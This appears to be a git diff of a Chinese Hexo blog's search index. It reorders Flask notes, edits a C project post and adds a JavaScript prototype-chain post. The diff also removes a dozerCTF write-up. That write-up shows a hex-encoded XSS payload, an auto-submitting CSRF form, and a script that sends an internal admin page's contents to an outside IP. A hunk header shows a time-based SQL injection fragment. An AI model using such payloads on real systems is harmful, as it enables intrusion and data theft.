@@ -33,6 +33,151 @@ $b = BENCHMARK(999999999,md5(1))
 ]]></content>
   </entry>
   <entry>
+    <title>FLASK学习笔记-WIP</title>
+    <url>/2020/02/24/FLASK%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-WIP/</url>
+    <content><![CDATA[<h1 id="flask学习笔记"><a href="#flask学习笔记" class="headerlink" title="flask学习笔记"></a>flask学习笔记</h1><p>这里是我的flask学习笔记，绝赞更新中！欢迎批评斧正。</p>
+<p>[TOC]</p>
+<h2 id="基本代码"><a href="#基本代码" class="headerlink" title="基本代码"></a>基本代码</h2><pre><code>from flask import Flask
+
+app = Flask(__name__)
+
+@app.route(&quot;/&quot;)
+def hello():
+    return &quot;Fuck this world!!!&quot;
+
+@app.route(&quot;/test/av&lt;int:video_id&gt;&quot;)
+def test(video_id):
+    return &apos;welcome %s&apos; % video_id
+
+if __name__ == &apos;__main__&apos;:
+    app.run(host=&apos;localhost&apos;)</code></pre><ol>
+<li><code>from flask import Flask</code>在这里我们为其导入了flask模块中的Flask类</li>
+<li><code>app = Flask(__name__)</code>新建了一个flask对象，其中<code>__name__</code>参数用来确认我们的模板和文件的地址。</li>
+<li>使用<code>route</code>函数和装饰器来确定激活函数的地址，这个被称为路由</li>
+</ol>
+<h2 id="启动flask"><a href="#启动flask" class="headerlink" title="启动flask"></a>启动flask</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><pre><code>set FLASK_APP=main.py
+# 确定启动起始点
+
+set FLASK_VNE=development
+# 设定为调试模式，代码一旦有改动自动重启服务器
+# 在实际中不要开启
+
+flask run --port 8848
+# 启动flask
+# --host 设置地址
+# --port 设置端口</code></pre><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>与windows类似</p>
+<pre><code>$ export FLASK_APP=main.py
+...</code></pre><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p><code>@app.route()</code>便是一个路由，在括号内填入地址，如上例一样，即可完成函数与路由的绑定。</p>
+<h3 id="路由中的参数"><a href="#路由中的参数" class="headerlink" title="路由中的参数"></a>路由中的参数</h3><pre><code>@app.route(&quot;/test/av&lt;int:video_id&gt;&quot;)
+def test(video_id):
+    if(video_id == 114514):
+        welcomeS = &apos;いいよ！こいよ！&apos;
+    else:
+        welcomeS = &quot;There is the&quot;
+    return welcomeS + &apos; &apos; + str(video_id)</code></pre><p>在上例中，我们在路由中规定了<code>&lt;int:video_id&gt;</code>来定义正整数类型参数<code>video_id</code>。再将其填入链接的函数内即可应用该参数。<br>以下列出了可填入的参数<br>string：接受一切不包括斜杠的字符<br>int：接受正整数<br>float：接受正浮点数<br>path：接受一切字符<br>uuid：接受uuid字符串</p>
+<h2 id="请求钩子"><a href="#请求钩子" class="headerlink" title="请求钩子"></a>请求钩子</h2><p>before_first_request：在第一个请求前运行<br>before_request：在每个请求前运行<br>after_request：在没有异常结束的请求后执行<br>teardown_reques：|在每个请求后执行(不论是否有异常)<br>after_this_request：在指定请求结束后执行</p>
+<pre class="mermaid">graph TB;
+    request(请求A)-->ifFirst{第一次请求?};
+    ifFirst--Yes-->before_first_request;
+    ifFirst--No-->before_request;
+    before_first_request-->before_request;
+    before_request-->viewA[视图A];
+    before_request-->viewB[视图B];
+    before_request-->viewC[视图C];
+    viewC-->after_this_request;
+    after_this_request-->ifExcept{有无异常?};
+    viewA-->ifExcept;
+    viewB-->ifExcept;
+    ifExcept--Yes-->teardown_request;
+    ifExcept--No-->after_request;
+    after_request-->teardown_request;
+    teardown_request-->response(响应A)</pre>
+
+<p>创建方式：</p>
+<pre><code>@app.before_first_request
+def before_first_request():
+    pass
+
+@app.before_request
+def before_request():
+    pass
+
+@app.route(&apos;/a&apos;)
+def A():
+    pass
+    @flask.after_this_request
+    def after_this_request():
+        pass
+    return &apos;&apos;
+
+@app.after_request
+def after_request():
+    pass
+
+@app.teardown_request
+def teardown_request():
+    pass</code></pre><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>其关键是看其有没有<code>/</code></p>
+<pre><code>@app.route(&quot;/test_1&quot;)
+def test_1():
+    return &quot;nothing&quot;
+
+@app.route(&quot;/test_2/&quot;)
+def test_2():
+    return &quot;nothing&quot;</code></pre><p>在上例的<code>test_1</code>中，我们没有在其最后添加“/”，这使得解释器（?）会将其解释为一个文件。如果访问时，在其背后加上“/”，会导致404错误。这样可以保持 URL 唯一，并帮助搜索引擎避免重复索引同一页面。<br>而<code>test_2</code>一例中，我们在定义是便加上了“/”，这样可以使其看起来像一个文件夹。</p>
+<h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><h3 id="302"><a href="#302" class="headerlink" title="302"></a>302</h3><p>302跳转有2种方式实现</p>
+<pre><code>pass
+return &apos;...&apos;, 302, {&apos;Location&apos;:&apos;https://www.baidu.com&apos;}
+
+from flask import Flask, redirect
+pass
+return redirect(&apos;https://www.baidu.com&apos;)</code></pre><h3 id="其它响应码"><a href="#其它响应码" class="headerlink" title="其它响应码"></a>其它响应码</h3><p>我们可以自定义使指定页面返回我们想要的响应码<br>使用函数<code>abort(响应码)</code><br>需要<code>from flask import abort</code></p>
+<h3 id="自定MIME格式"><a href="#自定MIME格式" class="headerlink" title="自定MIME格式"></a>自定MIME格式</h3><pre><code>from flask import Flask, make_response
+pass
+@app.route(&apos;/a&apos;)
+def A():
+    response = make_response(&apos;Hello World!&apos;)
+    response.mimetype = &apos;text/plain&apos;
+    return response</code></pre><h4 id="json格式"><a href="#json格式" class="headerlink" title="json格式"></a>json格式</h4><p>自然，我们可以将MIME设置为json。<br>通常，一个字典即可代表一段json。<br>但使用<code>json.dumps()</code>可以将元组和列表也序列化为json(没有键)<br>或者使用<code>jsonify()</code>，在<code>return</code>中返回。(也可以添加响应码)</p>
+<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>我们可以通过在<code>make_response()</code>对象中对cookie进行设置。</p>
+<pre><code>@app.route(&apos;/set/&lt;name&gt;&apos;)
+def setCooike(name):
+   response = make_response(redirect(url_for(&apos;hello&apos;)))
+   response.set_cookie(&apos;name&apos;, name)
+   return response</code></pre><p>上例可以在设置cookie之后重响应到<code>/hello</code><br>还有许多杂项和安全的设定</p>
+<ol>
+<li>max_age 被保存时间数，单位秒。默认会话结束时删除</li>
+<li>expires 具体过期时间</li>
+<li>path 限制cookie的可用路径，默认为整个域名</li>
+<li>domain 设置可用域名</li>
+<li>secure True时，只有https可以使用</li>
+<li>httponly True时，禁止客户端JS获取cookie</li>
+</ol>
+<h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>使用session首先需要设定secret_key<br>我们可以直接：<code>app.secret_key=&quot;value&quot;</code><br>或者将其设定为系统变量，用os模块获取</p>
+<p>一个用户登录的模型</p>
+<pre><code>@app.route(&apos;/login&apos;)
+def UserLogin():
+    name = FL.request.cookies.get(&apos;name&apos;)
+    if name is not None:
+        FL.session[&apos;LoggedIn&apos;] = True
+    return FL.redirect(FL.url_for(&apos;hello&apos;))</code></pre><p>我们使用<code>session[&#39;key&#39;]={value}</code>来设定一个session</p>
+<p>一个用户登出模型</p>
+<pre><code>@app.route(&apos;/logout&apos;)
+def UserLogout():
+    if &apos;LoggedIn&apos; in FL.session:
+        FL.session.pop(&apos;LoggedIn&apos;)
+    response = FL.make_response(FL.redirect(FL.url_for(&apos;hello&apos;)))
+    response.delete_cookie(&apos;name&apos;)
+    return response</code></pre><p>我们可以使用<code>session.pop(&#39;key&#39;)</code>来删除一个session</p>
+<p>WIP…</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Hello World!!!</title>
+    <url>/2020/02/24/Hello-World-0/</url>
+    <content><![CDATA[<p>您好！欢迎来到我的博客！</p>
+]]></content>
+  </entry>
+  <entry>
     <title>C语言实现学生信息管理系统</title>
     <url>/2020/03/17/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于疫情原因，最近只能呆在家里上网课，但实在不想听这个旅游管理的专业课（一直他喵的洗脑不要我们转专业DX）和英语（PS. 数学还是要听一听的），所以搞出来了这个东西……</p>
@@ -777,13 +922,13 @@ char str_2[11] = {0};
 
 //我改进了一下（
 scanf(&quot;%10[^\n]%*c&quot;, &amp;str_1);
-scanf(&quot;%10[^\n]%*c&quot;, &amp;str_2);</code></pre><p>详细资料：<a href="https://blog.csdn.net/q_l_s/article/details/22572777" target="_blank" rel="noopener">https://blog.csdn.net/q_l_s/article/details/22572777</a></p>
+scanf(&quot;%10[^\n]%*c&quot;, &amp;str_2);</code></pre><p>详细资料：<a href="https://blog.csdn.net/q_l_s/article/details/22572777">https://blog.csdn.net/q_l_s/article/details/22572777</a></p>
 <p>首先，第一个问题。采取<code>%10[^\n]%*c</code>的写法需要分开来讲：</p>
 <pre><code>{%10[^\n]}
     {10}:读入10个字符
     {[^\n}:读入回车符前(不含回车符)的所有字符
 {%*c}:忽略后面的字符</code></pre><p>可以查看上面的详细资料，资料就不展开了</p>
-<p>第二个问题的资料：<a href="https://blog.csdn.net/hhhhhyyyyy8/article/details/80917713" target="_blank" rel="noopener">https://blog.csdn.net/hhhhhyyyyy8/article/details/80917713</a><br>简单来说，就是前一个scanf把这次读取的回车符留在了缓冲区里，第二个scanf来读取缓冲区时便会读入这个回车导致第二个scanf被跳过。</p>
+<p>第二个问题的资料：<a href="https://blog.csdn.net/hhhhhyyyyy8/article/details/80917713">https://blog.csdn.net/hhhhhyyyyy8/article/details/80917713</a><br>简单来说，就是前一个scanf把这次读取的回车符留在了缓冲区里，第二个scanf来读取缓冲区时便会读入这个回车导致第二个scanf被跳过。</p>
 <h2 id="整体架构-结构"><a href="#整体架构-结构" class="headerlink" title="整体架构(结构?)"></a>整体架构(结构?)</h2><p>由于我没有学过软件工程之类的课程，所以这里的用词可能不太准确。</p>
 <pre><code>|-主函数
 |----|-次函数-|-功能函数
@@ -794,145 +939,6 @@ scanf(&quot;%10[^\n]%*c&quot;, &amp;str_2);</code></pre><p>详细资料：<a hre
     ...</code></pre><p>上面的结构打的有点混乱，简单来说就是每个功能有自己独立的主函数，由这个函数来调用功能函数。比如查询学生数据，有一个进行数据输入的主函数，然后将收集的信息加载到功能函数中。</p>
 <p>这次整体代码的架构很失败（PS. 最开始压根没有思考到架构这一码事，在慢慢码的过程中才发现架构很重要），有许多代码其实可以用函数封装重复使用。在早期还在一些功能上的函数里面加入了数据输入……下次需要注意。</p>
 <h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>emmmm总之就先这么多吧……以后来温故知新<br>PS. 估计以后不想看见这坨屎山（确信</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>FLASK学习笔记-WIP</title>
-    <url>/2020/02/24/FLASK%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-WIP/</url>
-    <content><![CDATA[<h1 id="flask学习笔记"><a href="#flask学习笔记" class="headerlink" title="flask学习笔记"></a>flask学习笔记</h1><p>这里是我的flask学习笔记，绝赞更新中！欢迎批评斧正。</p>
-<p>[TOC]</p>
-<h2 id="基本代码"><a href="#基本代码" class="headerlink" title="基本代码"></a>基本代码</h2><pre><code>from flask import Flask
-
-app = Flask(__name__)
-
-@app.route(&quot;/&quot;)
-def hello():
-    return &quot;Fuck this world!!!&quot;
-
-@app.route(&quot;/test/av&lt;int:video_id&gt;&quot;)
-def test(video_id):
-    return &apos;welcome %s&apos; % video_id
-
-if __name__ == &apos;__main__&apos;:
-    app.run(host=&apos;localhost&apos;)</code></pre><ol>
-<li><code>from flask import Flask</code>在这里我们为其导入了flask模块中的Flask类</li>
-<li><code>app = Flask(__name__)</code>新建了一个flask对象，其中<code>__name__</code>参数用来确认我们的模板和文件的地址。</li>
-<li>使用<code>route</code>函数和装饰器来确定激活函数的地址，这个被称为路由</li>
-</ol>
-<h2 id="启动flask"><a href="#启动flask" class="headerlink" title="启动flask"></a>启动flask</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><pre><code>set FLASK_APP=main.py
-# 确定启动起始点
-
-set FLASK_VNE=development
-# 设定为调试模式，代码一旦有改动自动重启服务器
-# 在实际中不要开启
-
-flask run --port 8848
-# 启动flask
-# --host 设置地址
-# --port 设置端口</code></pre><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>与windows类似</p>
-<pre><code>$ export FLASK_APP=main.py
-...</code></pre><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p><code>@app.route()</code>便是一个路由，在括号内填入地址，如上例一样，即可完成函数与路由的绑定。</p>
-<h3 id="路由中的参数"><a href="#路由中的参数" class="headerlink" title="路由中的参数"></a>路由中的参数</h3><pre><code>@app.route(&quot;/test/av&lt;int:video_id&gt;&quot;)
-def test(video_id):
-    if(video_id == 114514):
-        welcomeS = &apos;いいよ！こいよ！&apos;
-    else:
-        welcomeS = &quot;There is the&quot;
-    return welcomeS + &apos; &apos; + str(video_id)</code></pre><p>在上例中，我们在路由中规定了<code>&lt;int:video_id&gt;</code>来定义正整数类型参数<code>video_id</code>。再将其填入链接的函数内即可应用该参数。<br>以下列出了可填入的参数<br>string：接受一切不包括斜杠的字符<br>int：接受正整数<br>float：接受正浮点数<br>path：接受一切字符<br>uuid：接受uuid字符串</p>
-<h2 id="请求钩子"><a href="#请求钩子" class="headerlink" title="请求钩子"></a>请求钩子</h2><p>before_first_request：在第一个请求前运行<br>before_request：在每个请求前运行<br>after_request：在没有异常结束的请求后执行<br>teardown_reques：|在每个请求后执行(不论是否有异常)<br>after_this_request：在指定请求结束后执行</p>
-<pre class="mermaid">graph TB;
-    request(请求A)-->ifFirst{第一次请求?};
-    ifFirst--Yes-->before_first_request;
-    ifFirst--No-->before_request;
-    before_first_request-->before_request;
-    before_request-->viewA[视图A];
-    before_request-->viewB[视图B];
-    before_request-->viewC[视图C];
-    viewC-->after_this_request;
-    after_this_request-->ifExcept{有无异常?};
-    viewA-->ifExcept;
-    viewB-->ifExcept;
-    ifExcept--Yes-->teardown_request;
-    ifExcept--No-->after_request;
-    after_request-->teardown_request;
-    teardown_request-->response(响应A)</pre>
-
-<p>创建方式：</p>
-<pre><code>@app.before_first_request
-def before_first_request():
-    pass
-
-@app.before_request
-def before_request():
-    pass
-
-@app.route(&apos;/a&apos;)
-def A():
-    pass
-    @flask.after_this_request
-    def after_this_request():
-        pass
-    return &apos;&apos;
-
-@app.after_request
-def after_request():
-    pass
-
-@app.teardown_request
-def teardown_request():
-    pass</code></pre><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>其关键是看其有没有<code>/</code></p>
-<pre><code>@app.route(&quot;/test_1&quot;)
-def test_1():
-    return &quot;nothing&quot;
-
-@app.route(&quot;/test_2/&quot;)
-def test_2():
-    return &quot;nothing&quot;</code></pre><p>在上例的<code>test_1</code>中，我们没有在其最后添加“/”，这使得解释器（?）会将其解释为一个文件。如果访问时，在其背后加上“/”，会导致404错误。这样可以保持 URL 唯一，并帮助搜索引擎避免重复索引同一页面。<br>而<code>test_2</code>一例中，我们在定义是便加上了“/”，这样可以使其看起来像一个文件夹。</p>
-<h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><h3 id="302"><a href="#302" class="headerlink" title="302"></a>302</h3><p>302跳转有2种方式实现</p>
-<pre><code>pass
-return &apos;...&apos;, 302, {&apos;Location&apos;:&apos;https://www.baidu.com&apos;}
-
-from flask import Flask, redirect
-pass
-return redirect(&apos;https://www.baidu.com&apos;)</code></pre><h3 id="其它响应码"><a href="#其它响应码" class="headerlink" title="其它响应码"></a>其它响应码</h3><p>我们可以自定义使指定页面返回我们想要的响应码<br>使用函数<code>abort(响应码)</code><br>需要<code>from flask import abort</code></p>
-<h3 id="自定MIME格式"><a href="#自定MIME格式" class="headerlink" title="自定MIME格式"></a>自定MIME格式</h3><pre><code>from flask import Flask, make_response
-pass
-@app.route(&apos;/a&apos;)
-def A():
-    response = make_response(&apos;Hello World!&apos;)
-    response.mimetype = &apos;text/plain&apos;
-    return response</code></pre><h4 id="json格式"><a href="#json格式" class="headerlink" title="json格式"></a>json格式</h4><p>自然，我们可以将MIME设置为json。<br>通常，一个字典即可代表一段json。<br>但使用<code>json.dumps()</code>可以将元组和列表也序列化为json(没有键)<br>或者使用<code>jsonify()</code>，在<code>return</code>中返回。(也可以添加响应码)</p>
-<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>我们可以通过在<code>make_response()</code>对象中对cookie进行设置。</p>
-<pre><code>@app.route(&apos;/set/&lt;name&gt;&apos;)
-def setCooike(name):
-   response = make_response(redirect(url_for(&apos;hello&apos;)))
-   response.set_cookie(&apos;name&apos;, name)
-   return response</code></pre><p>上例可以在设置cookie之后重响应到<code>/hello</code><br>还有许多杂项和安全的设定</p>
-<ol>
-<li>max_age 被保存时间数，单位秒。默认会话结束时删除</li>
-<li>expires 具体过期时间</li>
-<li>path 限制cookie的可用路径，默认为整个域名</li>
-<li>domain 设置可用域名</li>
-<li>secure True时，只有https可以使用</li>
-<li>httponly True时，禁止客户端JS获取cookie</li>
-</ol>
-<h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>使用session首先需要设定secret_key<br>我们可以直接：<code>app.secret_key=&quot;value&quot;</code><br>或者将其设定为系统变量，用os模块获取</p>
-<p>一个用户登录的模型</p>
-<pre><code>@app.route(&apos;/login&apos;)
-def UserLogin():
-    name = FL.request.cookies.get(&apos;name&apos;)
-    if name is not None:
-        FL.session[&apos;LoggedIn&apos;] = True
-    return FL.redirect(FL.url_for(&apos;hello&apos;))</code></pre><p>我们使用<code>session[&#39;key&#39;]={value}</code>来设定一个session</p>
-<p>一个用户登出模型</p>
-<pre><code>@app.route(&apos;/logout&apos;)
-def UserLogout():
-    if &apos;LoggedIn&apos; in FL.session:
-        FL.session.pop(&apos;LoggedIn&apos;)
-    response = FL.make_response(FL.redirect(FL.url_for(&apos;hello&apos;)))
-    response.delete_cookie(&apos;name&apos;)
-    return response</code></pre><p>我们可以使用<code>session.pop(&#39;key&#39;)</code>来删除一个session</p>
-<p>WIP…</p>
 ]]></content>
   </entry>
   <entry>
@@ -972,224 +978,135 @@ $_SESSION[&apos;username&apos;] = &apos;guest&apos;;
 ]]></content>
   </entry>
   <entry>
-    <title>dozerCTF - Fake phpminiadmin</title>
-    <url>/2020/06/17/dozerCTF-Fake-phpminiadmin/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm虽然标题这么说有一点标题党，但我的确从这道CTF中认识到了XSS的作用可不止盗cookie</p>
-<h1 id="Fake-phpminiadmin"><a href="#Fake-phpminiadmin" class="headerlink" title="Fake phpminiadmin"></a>Fake phpminiadmin</h1><p>这道题开始给了一个页面可以执行sql语句。刚开始以为是sql注入之类的，但实际上在上面的一栏中有contact选项。明显是一道和xss有关的题了。</p>
-<h2 id="可以xss的点"><a href="#可以xss的点" class="headerlink" title="可以xss的点"></a>可以xss的点</h2><p>那么首先要找到可以xss的点，尝试在输出sql语句输出的地方插入js语句，发现<code>&lt;&gt;</code>尖括号被过滤了，证明这个地方有鬼。</p>
-<pre><code># 尝试以下语句，被阻拦
-select &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;
-# 尝试hex绕过，成功弹窗
-select 0x3C7363726970743E616C6572742831293C2F7363726970743E;</code></pre><p>接下来便是该想办法怎么样让机器人执行这里的sql。这里的sql数据使用了post，无法直接将带有弹窗数据的url直接发给机器人。<br>这里我想了两种方法：</p>
-<ol>
-<li>利用iframe+xss截图实现。</li>
-<li>利用CSRF进行跳转。</li>
-</ol>
-<p>首先一是不行的，进行测验，iframe只会在加载完js之后才会进行加载。导致无论如何利用js截图，都只能截到一个白框。<br>看起来只能跳转了。</p>
-<h2 id="利用CSRF进行跳转"><a href="#利用CSRF进行跳转" class="headerlink" title="利用CSRF进行跳转"></a>利用CSRF进行跳转</h2><p>首先机器人是不会对网址进行验证的，故我们可以在自己的vps上安置一个CSRF来对进行一个跳转。<br>不过，在当时我先是利用xss平台来确认一下机器人的cookie什么的，发现机器人的session没有特殊信息，但referrer给了一个特殊的网址：<code>http://127.0.0.1/admin_shark.php</code>,看起来这个内网的连接有东西。这更加证明了我们需要csrf来进行跳转，否则同源策略会阻挡我们获取这个内网连接的源码。<br>这里有一个点，便是admin_shark.php在外网下也可以访问，只不过会被拦截，提示你需要在内网访问。这代表着这个内网的服务器和公网的服务器是同一个（或者是是相同的）<br>数据被放置在了 <code>https://www.afkl.ml/xss.php</code>现在应该还能看到。在当时被安放了这么一组数据：</p>
-<pre><code>&lt;!DOCTYPE html&gt;
-&lt;form action=&quot;http://127.0.0.1/sql.php&quot; id=&quot;sql&quot; method=&quot;post&quot;&gt;
-  &lt;input type=text name=&quot;sql&quot; value=&quot;select 0x3C7343724970743E76617220743D6E657720584D4C487474705265717565737428293B742E6F70656E2822474554222C2261646D696E5F736861726B2E706870222C66616C7365293B742E73656E6428293B286E657720496D616765292E7372633D22687474703A2F2F34372E39342E3233392E3139342F3F6F75743D222B62746F6128742E726573706F6E736554657874293B3C2F7343526970543E;&quot; /&gt;
-&lt;/form&gt;
-&lt;script&gt;
-  var f = document.getElementById(&quot;sql&quot;);
-  f.submit();
-&lt;/script&gt;
-&lt;h1&gt;it works!&lt;/h1&gt; </code></pre><p>本质是是构建了一个表单，下面的js会令其强制POST表单内容(PS:foxfire会弹窗询问是否提交表单，但chrome不会)<br>其中hex后的内容是</p>
-<pre><code>&lt;sCrIpt&gt;var t=new XMLHttpRequest();t.open(&quot;GET&quot;,&quot;admin_shark.php&quot;,false);t.send();(new Image).src=&quot;http://47.94.239.194/?out=&quot;+btoa(t.responseText);&lt;/sCRipT&gt;
-(上面是我的测试vps)</code></pre><p>在测试vps上开启监听，提交url，静候佳音即可。</p>
-<pre><code>flag:Dozerctf{eed8cdc400dfd4ec85dff70a170066b7}</code></pre><p>PS:可惜当时没有知道beef-xss，知道了这道题就有趣多了（</p>
-]]></content>
+    <title>js的继承与原型链污染</title>
+    <url>/2020/07/01/js%E7%9A%84%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>迷迷糊糊终于搞懂了js的面向对象<del>（大概）</del>，这里简单记个笔记。</p>
+<h1 id="javascipt中的类"><a href="#javascipt中的类" class="headerlink" title="javascipt中的类"></a>javascipt中的类</h1><p>众所周知，javascript虽然可以进行面向对象编程，但其本身是没有class这一概念的。javascript使用function来实现class这一概念。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">this</span>.test = <span class="string">"aaa"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> o1;</span><br><span class="line"><span class="built_in">console</span>.log(a.test); <span class="comment">//aaa</span></span><br></pre></td></tr></table></figure>
+<p>即使是有class这一关键词，也只是一个语法糖，其本质还是function</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">o1</span> </span>&#123;</span><br><span class="line">	<span class="keyword">constructor</span>() &#123;</span><br><span class="line">		<span class="keyword">this</span>.test = <span class="string">"aaa"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> o1); <span class="comment">//function</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><p>js的继承有多种方法实现，这里只介绍组合继承</p>
+<h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p>对于一个类，它有自己的原型对象<code>Class.prototype</code>，通过<code>prototype</code>关键字访问<br>对于一个类的实例（对象），它可以通过<code>__proto__</code>关键词访问对应的原型对象<br>而关键词<code>constructor</code>是上面两个的逆过程<br>一个原型对象也可以通过<code>__proto__</code>访问父级原型对象<br>总结：<br><code>prototype</code> 类的关键词，访问对应原型对象<br><code>__proto__</code> 对象的关键词，访问对应原型对象<br><code>constructor</code> 对象的关键词，访问对应的类</p>
+<p>下例是一个继承链和构造函数的组合继承</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o1</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.id = id;</span><br><span class="line">&#125;;</span><br><span class="line">o1.prototype.sayId = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o2</span>(<span class="params">id, name</span>) </span>&#123;</span><br><span class="line">    o1.call(<span class="keyword">this</span>, id);</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">o2.prototype = <span class="keyword">new</span> o1();</span><br><span class="line">o2.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line">o2.prototype.constructor = o2;</span><br></pre></td></tr></table></figure>
+<h2 id="o2-prototype-constructor-o2"><a href="#o2-prototype-constructor-o2" class="headerlink" title="o2.prototype.constructor = o2 ???"></a>o2.prototype.constructor = o2 ???</h2><p>请看下例</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.o1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    o1.call(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.o2 = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">o2.prototype = <span class="keyword">new</span> o1;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    o2.call(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.o3 = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">o3.prototype = <span class="keyword">new</span> o2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test = <span class="keyword">new</span> o3;</span><br><span class="line"><span class="built_in">console</span>.log(test.constructor == o3);</span><br></pre></td></tr></table></figure>
+<p>请猜猜最后输出什么？<br>最开始我认为对象的constructor应该指向自己的构造函数，所以应该是true？<br>但这是不对的，是false！<br>construstor属性也是可以继承的，这样一层一层继承导致o3继承了o1的construstor<br>我这样写继承是错误的，正确的方法应该是这样的，将原型的construstor重新指向自己的构造函数。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.o1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    o1.call(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.o2 = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o2.prototype = <span class="keyword">new</span> o1;</span><br><span class="line">o2.prototype.constructor = o2;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    o2.call(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.o3 = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o3.prototype = <span class="keyword">new</span> o2;</span><br><span class="line">o3.prototype.constructor = o3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test = <span class="keyword">new</span> o3;</span><br><span class="line"><span class="built_in">console</span>.log(test.constructor == o1); <span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(test.constructor == o3); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="成员属性"><a href="#成员属性" class="headerlink" title="成员属性"></a>成员属性</h1><h2 id="private"><a href="#private" class="headerlink" title="private"></a>private</h2><p>对于<code>private</code>属性的成员来说来说，它只可以在构造函数内部使用的时候进行访问。<br>根据<code>let</code>关键词的特性（不会变量提升，可以只在块级作用域作用等），它可以作为private使用。<br>同时，对于私有的方法，可以直接套娃实现。这样的函数无法被实例化的对象调用，也不会被继承。<br>如果它可以被外部访问，那它准确来说是一个protected属性。</p>
